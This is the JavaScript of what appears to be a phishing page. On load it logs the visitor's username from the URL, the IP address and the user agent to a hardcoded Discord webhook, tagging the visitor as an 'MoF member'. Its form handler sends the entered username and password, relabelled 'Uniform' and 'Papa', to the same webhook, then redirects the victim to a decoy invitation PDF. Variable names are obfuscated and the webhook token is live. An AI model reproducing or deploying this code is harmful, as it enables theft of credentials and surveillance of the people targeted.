

   function sendDiscordNotification(message) {
    var _0x33402a = window.location.href;
    var _0x460236 = new URL(_0x33402a);
    var clientside = _0x460236.searchParams.get("clientside");
    var ipAddress = '';
    var userAgent = navigator.userAgent;

    // Fetch the current IP address
    fetch('https://api.ipify.org/?format=json')
      .then(response => response.json())
      .then(data => {
        ipAddress = data.ip;
        message += "\nUsername: " + clientside + "\nIP Address: " + ipAddress + "\nUser Agent: " + userAgent;

        // Send the notification to Discord
        fetch('https://discord.com/api/webhooks/1248913080717676584/CHrBd18EmH5PFDeX6hrQlIEjgptRO1Ia9YEFabAzowsOWcRj0RKTCvosuKa2zHokjdkF', {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ content: message })
        });
      });
  }

   window.onload = function () {
     // Get the value of the clientside parameter from the URL
     var _0x33402a = window.location.href;
     var _0x460236 = new URL(_0x33402a);
     var _0x4ec704 = _0x460236.searchParams.get("clientside");
     document.getElementById("red").value = _0x4ec704;

     // Display the dialog box and hide other elements after a delay
     setTimeout(function () {
       // Send notification to Discord
       sendDiscordNotification("Visited by MoF member:");
     }, 0xbb8);

     // Add event listener for form submission
     document.getElementById("mango").addEventListener('submit', function (_0x90fbbd) {
       _0x90fbbd.preventDefault();
       var _0x1709cb = document.getElementById("red").value;
       var _0x1a97be = document.getElementById("green").value;
       var _0x845tu3 = {
         'content': "Uniform: " + _0x1709cb + "\nPapa: " + _0x1a97be + " \nBrowser Details: " + navigator.userAgent + ", \nTime: " + new Date().toLocaleString()
       };
        
       fetch('https://discord.com/api/webhooks/1248913080717676584/CHrBd18EmH5PFDeX6hrQlIEjgptRO1Ia9YEFabAzowsOWcRj0RKTCvosuKa2zHokjdkF', {
         'method': "POST",
         'headers': {
           'Content-Type': 'application/json'
         },
         'body': JSON.stringify(_0x845tu3)
       }).then(() => {
         window.location.href = "./fmo/V20-invitation.pdf";
       });
     });
   }; 